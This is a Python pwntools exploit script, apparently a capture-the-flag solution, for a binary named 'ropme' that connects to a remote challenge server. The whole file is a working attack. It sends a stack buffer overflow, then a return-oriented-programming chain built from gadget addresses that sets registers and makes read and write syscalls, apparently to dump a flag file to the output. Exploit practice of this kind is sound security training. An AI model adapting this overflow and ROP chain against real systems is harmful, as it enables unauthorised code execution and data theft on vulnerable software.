#!/usr/bin/env python2.7

from pwn import *

def start():
    global p
    global elf
    prog  = "./ropme"    

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 6004

        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

def read():
    # ecx := *esp
    payload = p32(0x080484ec)       # mov ebp, esp
    payload += p32(0x08048534)      # mov ecx, esp; nop; leave; ret;

    # eax := 3; ebx := 3
    payload += p32(0x080484ef)      # xor edx, edx; ret
    payload += p32(0x08048505) * 3  # inc edx; ret
    payload += p32(0x08048500)      # mov eax, edx; mov ebx, edx; ret

    # edx += 100 (edx == 103)
    payload += p32(0x08048505) * 100  # inc edx; ret

    payload += p32(0x080484f2)      # int 0x80

    return payload

def write():
    # eax := 4
    payload  = p32(0x080484ef)      # xor edx, edx; ret
    payload += p32(0x08048505) * 4  # inc edx; ret
    payload += p32(0x08048500)      # mov eax, edx; mov ebx, edx; ret

    # ebx := 1
    payload += p32(0x080484ef)      # xor edx, edx; ret
    payload += p32(0x08048505)      # inc edx; ret
    payload += p32(0x08048502)      # mov ebx, edx; ret;

    # edx := 100
    payload += p32(0x08048505) * 100  # inc edx; ret

    payload += p32(0x080484f2)      # int 0x80

    return payload

start()

payload = b"A" * 0xC
# First set up a payload to read the /flag file and store this on the stack
payload += read()
# Then set up a payload to write the stack back onto STDOUT
payload += write()

p.sendlineafter("data:", payload)

p.interactive()
p.close()